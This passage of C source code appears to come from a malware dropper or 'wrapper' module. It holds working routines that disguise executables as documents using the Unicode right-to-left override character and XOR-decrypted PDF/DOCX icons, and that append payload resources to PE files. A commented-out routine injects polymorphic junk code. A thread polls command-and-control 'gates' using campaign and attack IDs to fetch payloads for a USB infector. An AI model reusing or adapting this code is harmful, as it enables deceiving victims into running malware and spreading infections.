	new_pool		= (PDWORD)VirtualAlloc(NULL, (SIZE_T)buffer_size + 0x2000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	CopyMemory(new_pool, *buffer, *buffer_size);

	// Reset pointers
	*buffer			= new_pool;
	*buffer_size	+= 0x2000;

	// Generate new section_headers
	dos_header				= (PIMAGE_DOS_HEADER)((DWORD_PTR)*buffer);
	nt_headers				= (PIMAGE_NT_HEADERS32)((DWORD_PTR)*buffer + dos_header->e_lfanew);
	xdata_section_header	= (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(nt_headers) + ((sizeof(IMAGE_SECTION_HEADER) * nt_headers->FileHeader.NumberOfSections)));
	rdata_section_header	= (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(nt_headers) + ((sizeof(IMAGE_SECTION_HEADER) * (nt_headers->FileHeader.NumberOfSections + 1))));

	// Generate xdata section
	xdata_section_header->Misc.VirtualSize	= 0x1000;
	xdata_section_header->VirtualAddress	= (DWORD)((PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(nt_headers) + (sizeof(IMAGE_SECTION_HEADER) * (nt_headers->FileHeader.NumberOfSections - 1))))->VirtualAddress +
												(DWORD)((PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(nt_headers) + (sizeof(IMAGE_SECTION_HEADER) * (nt_headers->FileHeader.NumberOfSections - 1))))->Misc.VirtualSize;
	xdata_section_header->SizeOfRawData		= 0x1000;
	xdata_section_header->PointerToRawData	= (DWORD)((PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(nt_headers) + (sizeof(IMAGE_SECTION_HEADER) * (nt_headers->FileHeader.NumberOfSections - 1))))->PointerToRawData +
												(DWORD)((PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(nt_headers) + (sizeof(IMAGE_SECTION_HEADER) * (nt_headers->FileHeader.NumberOfSections - 1))))->SizeOfRawData;
	xdata_section_header->Characteristics	= 0xC0000040;
	ZeroMemory(segment_name, sizeof(segment_name));
	xdata_section_header->Name[0] = '.';
	for (i = 1; i < 5; i++) {
		xdata_section_header->Name[i] = char_map[generate_random_byte_range(sizeof(char_map) - 1)];
	}

	// Generate rdata section
	rdata_section_header->Misc.VirtualSize	= 0x1000;
	rdata_section_header->VirtualAddress	= xdata_section_header->Misc.VirtualSize + xdata_section_header->VirtualAddress;
	rdata_section_header->SizeOfRawData		= 0x1000;
	rdata_section_header->PointerToRawData	= xdata_section_header->SizeOfRawData + xdata_section_header->PointerToRawData;
	rdata_section_header->Characteristics	= 0xC0000040;
	ZeroMemory(segment_name, sizeof(segment_name));
	rdata_section_header->Name[0] = '.';
	for (i = 1; i < 5; i++) {
		rdata_section_header->Name[i] = char_map[generate_random_byte_range(sizeof(char_map) - 1)];
	}

	// Adjust NT headers
	nt_headers->FileHeader.NumberOfSections += 2;
	nt_headers->OptionalHeader.SizeOfImage	+= 0x2000;

	// Load resource
#ifndef _WIN64
	resource	= FindResource(get_local_dll_base(), MAKEINTRESOURCE(IDR_XTG_ENGINE1), "XTG_ENGINE");
	global		= LoadResource(get_local_dll_base(), resource);
#else
	resource	= FindResource(get_local_dll_base64(), MAKEINTRESOURCE(IDR_XTG_ENGINE1), "XTG_ENGINE");
	global		= LoadResource(get_local_dll_base64(), resource);
#endif
	LockResource(global);

	// Get a pointer to the shellcode & allocate new buffer
	get_shellcode_from_pe((PDWORD)global, (PDWORD *)&ptr, &xTG_size);
	xTG_buffer = (PDWORD)VirtualAlloc(NULL, xTG_size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	CopyMemory(xTG_buffer, ptr, xTG_size);

	// Free resource
	UnlockResource(global);
	FreeResource(global);

	// Get ptr to code to be mutated
	get_shellcode_from_pe((PDWORD)global, &shellcode_base, &shellcode_size);

	// Allocate memory for generated trash
	generated_trash					= (PDWORD)VirtualAlloc(NULL, round(shellcode_size, 0x1000), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

	// Set fpointer
	//xTG2 = (BOOL (__stdcall*)(__inout PXTG_MAIN_STRUCT))xTG_buffer;

	// Setup XTG_TRASH_GEN
	xtg_trash_gen.fmode				= XTG_REALISTIC;
	xtg_trash_gen.rang_addr			= 0;
	xtg_trash_gen.faka_addr			= 0;
	xtg_trash_gen.faka_struct_addr	= 0;
	xtg_trash_gen.alloc_addr		= (DWORD32)xVirtualAlloc;
	xtg_trash_gen.free_addr			= (DWORD32)xVirtualFree;
	xtg_trash_gen.tw_trash_addr		= (DWORD32)generated_trash;
	xtg_trash_gen.trash_size		= (UINT32)0xa00;
	xtg_trash_gen.xmask1			= (DWORD32)(XTG_FUNC + XTG_REALISTIC_WINAPI + XTG_LOGIC);
	xtg_trash_gen.xmask2			= 0;
	xtg_trash_gen.xdata_struct_addr	= (DWORD32)&xtg_data_struct;

	// Setup XTG_DATA_STRUCT
	xtg_data_struct.xmask			= XTG_DG_ON_XMASK;
	xtg_data_struct.rdata_addr		= (DWORD32)((DWORD)*buffer + rdata_section_header->PointerToRawData);
	xtg_data_struct.rdata_size		= (UINT32)0x1000;
	xtg_data_struct.rdata_pva		= XTG_OFFSET_ADDR;
	xtg_data_struct.xdata_addr		= (DWORD32)((DWORD)nt_headers->OptionalHeader.ImageBase + xdata_section_header->VirtualAddress);
	xtg_data_struct.xdata_size		= (UINT32)0x1000;

	// Stamp in shellcode base address
	*(PDWORD)((DWORD_PTR)xTG_buffer + 1) = (DWORD)xTG_buffer;

	// Set function pointer
	//BREAK;
	xtg_main_struct.trash_gen_structure	= &xtg_trash_gen;
	xTG2 = (BOOL (__cdecl *)(__inout PXTG_MAIN_STRUCT))xTG_buffer;

	//BREAK;

	// Call engine
	xTG2(&xtg_main_struct);

	// Copy generated trash into PE
	text_section = IMAGE_FIRST_SECTION(nt_headers);
	CopyMemory((LPVOID)((DWORD)new_pool + (DWORD)text_section->PointerToRawData), 
		(LPVOID)xtg_trash_gen.tw_trash_addr, xtg_trash_gen.trash_size);

#ifdef DEBUG_OUT
	DEBUG("+wrapper> xTG2.0 Output: 0x%08x [%d]", xtg_trash_gen.tw_trash_addr, xtg_trash_gen.trash_size);
#endif

	// Copy the generated trash
	CopyMemory((PVOID)((DWORD_PTR)new_pool + (DWORD)text_section->PointerToRawData),
				generated_trash,
				0x1000);

	return;
}*/

BOOL rtl_character_rename(__in LPCSTR file_name, __in LPCSTR extension, __out LPWSTR unicode_output)
{
	WCHAR			unicode_path[MAX_PATH * 2]				= {0};
	WCHAR			original_unicode_path[MAX_PATH * 2]		= {0};
	CHAR			ascii_path[MAX_PATH]					= {0};
	CHAR			orig_extension[MAX_PATH]				= {0};
	CHAR			tmp;

	CHAR			extension_buffer_ascii[MAX_PATH]		= {0};
	WCHAR			extension_buffer_unicode[MAX_PATH]		= {0};

	PWORD			unicode_ptr;
	PBYTE			ptr;

	UINT			i;

#ifndef INVOKE_RTO
	return TRUE;
#endif

	ascii_to_unicode(file_name, original_unicode_path);

	CopyMemory(ascii_path, file_name, string_length(file_name));

	ptr = (PBYTE)((DWORD_PTR)ascii_path + string_length(file_name));

	// Get to the extension
	while (*ptr != '.') {
		ptr--;
	}
	CopyMemory((LPCSTR)orig_extension, (LPCSTR)ptr, string_length(ptr));

	// Zero the extension
	ZeroMemory(ptr, string_length(ptr));

	// Generate the unicode path
	ascii_to_unicode(ascii_path, unicode_path);

	// Get to the end of the unicode string
	unicode_ptr = (PWORD)((DWORD_PTR)unicode_path + get_unicode_string_length(unicode_path));
	
	// Install dot
	//*unicode_ptr = L".";
	//unicode_ptr++;

	// Install RTO
	*unicode_ptr = 0x202e;

	// asdfasdfexe.doc		-> cod.exe
	CopyMemory(extension_buffer_ascii, extension, string_length(extension));

	// Reverse the extension buffer .doc .docx (xcod.)
	for (i = 0; i < (string_length(extension) / 2); i++) {
		tmp = extension_buffer_ascii[i];
		extension_buffer_ascii[i] = extension_buffer_ascii[string_length(extension) - i - 1];
		extension_buffer_ascii[string_length(extension) - i - 1] = tmp;
	}
	ascii_to_unicode(extension_buffer_ascii, extension_buffer_unicode);

	// Append
	unicode_ptr++;
	CopyMemory(unicode_ptr, extension_buffer_unicode, get_unicode_string_length(extension_buffer_unicode));

	// Add exe
	unicode_ptr = (PWORD)((DWORD_PTR)unicode_ptr + get_unicode_string_length(extension_buffer_unicode));
	CopyMemory(unicode_ptr, L"exe", get_unicode_string_length(L"exe"));

	// Move file
	MoveFileW(original_unicode_path, unicode_path);

	// Save output
	CopyMemory(unicode_output, unicode_path, get_unicode_string_length(unicode_path));

	return TRUE;
}

BOOL install_pe_resource(	__inout		PDWORD		*base,					// Input: base, Output: Reallocated new Base
							__inout		PUINT		base_size,				// Input: base size, Output: New Base Size
							__in		DWORD		identifier,
							__in		LPCSTR		identifier_name,
							__in		HMODULE		dll_base)
{
	PIMAGE_DOS_HEADER		dos_header;
	PIMAGE_NT_HEADERS32		nt_headers;
	PIMAGE_SECTION_HEADER	section_header;


	HRSRC					resource;
	HGLOBAL					global;

	PDWORD					new_base;

	UINT					size_of_resource;

#ifdef DEBUG_OUT
	//DEBUG("+wrapper> Packing resource");
#endif

	// Get pointers to resource
#ifndef _WIN64
	resource		= FindResource(dll_base, MAKEINTRESOURCE(identifier), identifier_name);
	global			= LoadResource(dll_base, resource);
#else
	resource		= FindResource(dll_base, MAKEINTRESOURCE(identifier), identifier_name);
	global			= LoadResource(dll_base, resource);
#endif
	LockResource(global);
	if (resource == NULL || global == NULL) {
		return FALSE;
	}

	// Get size
#ifndef _WIN64
	size_of_resource = SizeofResource(dll_base, resource);
#else
	size_of_resource = SizeofResource(dll_base, resource);
#endif

	// Reallocate memory
	// Get headers
	dos_header		= (PIMAGE_DOS_HEADER)*base;
	nt_headers		= (PIMAGE_NT_HEADERS32)((DWORD_PTR)*base + dos_header->e_lfanew);
	new_base		= (PDWORD)VirtualAlloc(NULL, (SIZE_T)(*base_size + round(size_of_resource, nt_headers->OptionalHeader.SectionAlignment)), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	CopyMemory(new_base, *base, *base_size);
	VirtualFree(*base, *base_size, MEM_RELEASE);

	// Get headers
	dos_header		= (PIMAGE_DOS_HEADER)new_base;
	nt_headers		= (PIMAGE_NT_HEADERS32)((DWORD_PTR)new_base + dos_header->e_lfanew);

	if (dos_header->e_magic != 'ZM' || nt_headers->Signature != 'EP') {
		return FALSE;
	}

	section_header	= (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(nt_headers) + (DWORD_PTR)(sizeof(IMAGE_SECTION_HEADER) * nt_headers->FileHeader.NumberOfSections));
	//section_header		= (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(nt_headers) + (SIZE_T)(sizeof(IMAGE_SECTION_HEADER) * 2));

	// Generate new segment header
	section_header->Misc.VirtualSize		= round(size_of_resource, nt_headers->OptionalHeader.SectionAlignment);
	section_header->VirtualAddress			= (DWORD)((PIMAGE_SECTION_HEADER)((DWORD_PTR)section_header - sizeof(IMAGE_SECTION_HEADER)))->VirtualAddress +
												(DWORD)((PIMAGE_SECTION_HEADER)((DWORD_PTR)section_header - sizeof(IMAGE_SECTION_HEADER)))->Misc.VirtualSize;
	section_header->SizeOfRawData			= size_of_resource;
	section_header->PointerToRawData		=	round((DWORD)((PIMAGE_SECTION_HEADER)((DWORD_PTR)section_header - sizeof(IMAGE_SECTION_HEADER)))->PointerToRawData +
												(DWORD)((PIMAGE_SECTION_HEADER)((DWORD_PTR)section_header - sizeof(IMAGE_SECTION_HEADER)))->SizeOfRawData, 
												nt_headers->OptionalHeader.FileAlignment);
												//(DWORD)((PIMAGE_SECTION_HEADER)((DWORD_PTR)section_header - sizeof(IMAGE_SECTION_HEADER)))->PointerToRawData +
												//(DWORD)((PIMAGE_SECTION_HEADER)((DWORD_PTR)section_header - sizeof(IMAGE_SECTION_HEADER)))->SizeOfRawData, 
												//nt_headers->OptionalHeader.FileAlignment;
	section_header->Characteristics			= (DWORD)0x40000040;
	CopyMemory(section_header->Name, ".rsrc", string_length(".rsrc"));

	// Copy resource into new segment
	CopyMemory(	(PVOID)((DWORD_PTR)new_base + section_header->PointerToRawData), (PVOID)global, size_of_resource);

	// Update nt header
	nt_headers->OptionalHeader.SizeOfImage = section_header->VirtualAddress + section_header->Misc.VirtualSize;
	nt_headers->FileHeader.NumberOfSections++;

	// Update resource directories in nt header
	nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE].Size			= section_header->Misc.VirtualSize;
	nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE].VirtualAddress	= section_header->VirtualAddress;

	// Free resource
	UnlockResource(global);
	FreeResource(global);

	// Set outputs
	*base			= new_base;
	*base_size		= section_header->SizeOfRawData + section_header->PointerToRawData;

	return TRUE;
}



BOOL install_template_resource(LPCSTR template_path, LPCSTR original_file_path)
{
	ERROR_CODE			status;

	PDWORD				icon_buffer;
	UINT				icon_buffer_size;

	HMODULE				local_base;

	HRSRC				resource;
	HGLOBAL				global;

	ICONDIR				icon_directory				= {0};
	PICONIMAGE			icon_images[MAX_ICONS]		= {0};

	PBYTE				ptr;

	LPSTR				name;
	LPSTR				type;

	// Find the correct icon
	ptr = (PBYTE)((DWORD_PTR)original_file_path + string_length(original_file_path));
	while (*ptr != '.') {
		ptr--;
	}

	switch (*(PDWORD)ptr) {
	case 'fdp.':
		name = MAKEINTRESOURCE(IDR_PDF_ICON1);
		type = "PDF_ICON";
		break;
	case 'cod.':
		if (!string_compare(ptr, ".docx", string_length(".docx"))) {
			// docx
			name = MAKEINTRESOURCE(IDR_DOCX_ICON1);
			type = "DOCX_ICON";
			break;
		} else {
			// docx
			return FALSE;
		}
	default:
		return FALSE;
	}

	// Load resource (XOR'd)
#ifndef _WIN64
	resource			= FindResource(get_local_dll_base(), name, type);
	if (resource == NULL) {
		return FALSE;
	}
	global				= LoadResource(get_local_dll_base(), resource);
#else
	resource			= FindResource(get_local_dll_base64, name, type);
	if (resource == NULL) {
		return FALSE;
	}
	global				= LoadResource(get_local_dll_base64(), resource);
#endif
	LockResource(global);

#ifndef _WIN64
	icon_buffer_size	= SizeofResource(get_local_dll_base(), resource);
#else
	icon_buffer_size	= SizeofResource(get_local_dll_base64(), resource);
#endif

	icon_buffer			= (PDWORD)HeapAlloc(GetProcessHeap(), 0, icon_buffer_size);
	ZeroMemory(icon_buffer, icon_buffer_size);
	CopyMemory(icon_buffer, (PVOID)global, icon_buffer_size);
	xor32_data(ICON_DATA_XOR_KEY, icon_buffer, icon_buffer_size);

	UnlockResource(resource);
	FreeResource(global);

	// Build icon structures
	extract_ico(icon_buffer, icon_buffer_size, &icon_directory, icon_images);

	// Add resource to image
	install_ico_pe(template_path, &icon_directory, icon_images);

	// Cleanup
	// remember to free icon_images
	HeapFree(GetProcessHeap(), 0, icon_buffer);

	return TRUE;
}

VOID install_ico_pe(LPCSTR file_name, PICONDIR icon_directory, PICONIMAGE icon_images[MAX_ICONS])
{
	HANDLE			update;
	PBYTE			ico_header, ptr;
	UINT			i, ico_header_size;
	CHAR			directory_name[256]					= {0};

	ico_header_size		=  (UINT)((sizeof(WORD) * 3) + (icon_directory->count * sizeof(RESICONENTRY)));
	ico_header			= (PBYTE)HeapAlloc(GetProcessHeap(), 0, ico_header_size);
	ZeroMemory(ico_header, ico_header_size);

	// Construct the ICO header
	CopyMemory(ico_header, icon_directory, sizeof(WORD) * 3);
	ptr = (PBYTE)((DWORD_PTR)ico_header + sizeof(WORD) * 3);
	for (i = 0; i < icon_directory->count; i++) {
		CopyMemory(ptr, icon_directory->icon_dir_entries[i], sizeof(RESICONENTRY));
		*(PWORD)((DWORD_PTR)ptr + 12) = i + 1; //this is a WORD index value, instead of the DWORD offset of the ICO file
		ptr = (PBYTE)((DWORD_PTR)ptr + sizeof(RESICONENTRY) - 2);
	}

	update = BeginUpdateResourceA(file_name, FALSE);

	f_snprintf(directory_name, sizeof(directory_name), "S%d", generate_random_byte_range(250));

	UpdateResource(update, RT_GROUP_ICON, MAKEINTRESOURCE(directory_name), 1033, ico_header, ico_header_size);

	for (i = 0; i < icon_directory->count; i++) {
		UpdateResource(update, RT_ICON, MAKEINTRESOURCE(i + 1), 1033, icon_images[i],
			icon_directory->icon_dir_entries[i]->bytes_in_res);		
	}

	EndUpdateResource(update, FALSE);

	return;
}

VOID extract_ico(PDWORD icon_file, UINT icon_file_size, PICONDIR icon_directory, PICONIMAGE icon_images[MAX_ICONS])
{
	UINT			i;
	PBYTE			ptr;

	// Build directory
	icon_directory->reserved	= *(PWORD)icon_file;
	icon_directory->type		= *(PWORD)((DWORD_PTR)icon_file + sizeof(WORD));
	icon_directory->count		= *(PWORD)((DWORD_PTR)icon_file + (sizeof(WORD) * 2));

	// Read in the icon directories (ICONDIRENTRY)
	ptr = (PBYTE)((DWORD_PTR)icon_file + (sizeof(WORD) * 3));
	for (i = 0; i < icon_directory->count; i++) {
		icon_directory->icon_dir_entries[i] = (PICONDIRENTRY)HeapAlloc(GetProcessHeap(), 0, sizeof(ICONDIRENTRY));
		ZeroMemory(icon_directory->icon_dir_entries[i], sizeof(ICONDIRENTRY));
		CopyMemory(icon_directory->icon_dir_entries[i], ptr, sizeof(ICONDIRENTRY));
		ptr = (PBYTE)((DWORD_PTR)ptr + sizeof(ICONDIRENTRY));
	}

	// Read each image
	for (i = 0; i < icon_directory->count; i++) {

		icon_images[i] = (PICONIMAGE)HeapAlloc(GetProcessHeap(), 0, icon_directory->icon_dir_entries[i]->bytes_in_res);
		ZeroMemory(icon_images[i], icon_directory->icon_dir_entries[i]->bytes_in_res);

		CopyMemory(icon_images[i], 
			(PVOID)((DWORD_PTR)icon_file + icon_directory->icon_dir_entries[i]->image_offset),
			icon_directory->icon_dir_entries[i]->bytes_in_res);
		
	}

	return;
}

VOID template_dl_thread(PGLOBAL_CONFIGURATION config)
{
	ERROR_CODE					status;

	CHAR						url[1024];

	PDWORD						skel_template;
	UINT						skel_template_size;

	LPSTR						gatelist;
	PCHAR						gates[MAX_GATES]					= {0};
	UINT						i, number_of_gates;

	wrapper_dl_thread_state		= WRAPPER_DL_THREAD_STATE;

	// Split our gate list
	gatelist = (LPSTR)HeapAlloc(GetProcessHeap(), 0, string_length(config->gate_list_string) + 1);
	//gatelist = (LPSTR)HeapAlloc(GetProcessHeap(), 0, string_length(GATE_LIST_TEST) + 1);
	//ZeroMemory(gatelist, string_length(GATE_LIST_TEST) + 1);
	//CopyMemory(gatelist, GATE_LIST_TEST, string_length(GATE_LIST_TEST));
	ZeroMemory(gatelist, string_length(config->gate_list_string) + 1);
	CopyMemory(gatelist, config->gate_list_string, string_length(config->gate_list_string));
	gates[0] = strtok(gatelist, GATE_DELIMITER);
	for (i = 1; i < MAX_GATES; i++) {
		gates[i] = strtok(NULL, GATE_DELIMITER);
	}

	number_of_gates = 0;
	while  (gates[number_of_gates] != NULL) {
		number_of_gates++;
	}

	// Iterate through all gates
	i = 0;
	while (TRUE) {

		// Create the URL
		ZeroMemory(url, sizeof(url));
		f_snprintf(url, sizeof(url), "%s?w=%d&a=%d?m=skel", gates[i], config->campaign_id, config->attack_id);

#ifdef DEBUG_OUT
		//DEBUG("wrapper> Using gate %s to download template", gates[i]);
#endif

		status = grab_gateway_payload(&skel_template, &skel_template_size, gates[i]);
		if (status) {

#ifdef DEBUG_OUT
		//DEBUG("wrapper> Success", gates[i]);
#endif

			wrapper_skeleton			= skel_template;
			wrapper_skeleton_size		= skel_template_size;

			// Signal our usb infector thread that a payload is ready
			if (wrapper_template_buffer_ready == INVALID_HANDLE_VALUE) {

				Sleep(WRAPPER_GATE_WAIT);

				i++;
				if (i > number_of_gates) {
					i = 0;
				}
			}
			SetEvent(wrapper_template_buffer_ready);
		}

		Sleep(WRAPPER_GATE_WAIT);

		i++;
		if (i > number_of_gates) {
			i = 0;
		}
	}
}

BOOL template_dispatch_dl_thread(PGLOBAL_CONFIGURATION config)
{

	wrapper_dl_thread_state				= 0;
	wrapper_template_buffer				= 0;
	wrapper_template_buffer_ready		= CreateEventA(NULL, FALSE, FALSE, WRAPPER_DL_THREAD_BUF_RDY);

	if (wrapper_template_buffer_ready == INVALID_HANDLE_VALUE) {
		return FALSE;
	}

#ifdef DEBUG_OUT
	DEBUG("+wrapper%d> Dispatching template downloader", GetCurrentProcessId());
#endif

	dispatch_thread((LPTHREAD_START_ROUTINE)template_dl_thread, config);
	
}

BOOL template_check(PGLOBAL_CONFIGURATION config)
{
	ERROR_CODE					status;

	// Check if our downloader thread was dispatched
	if (wrapper_dl_thread_state != WRAPPER_DL_THREAD_STATE) {
		status = (ERROR_CODE)template_dispatch_dl_thread(config);
	}

	return TRUE;
}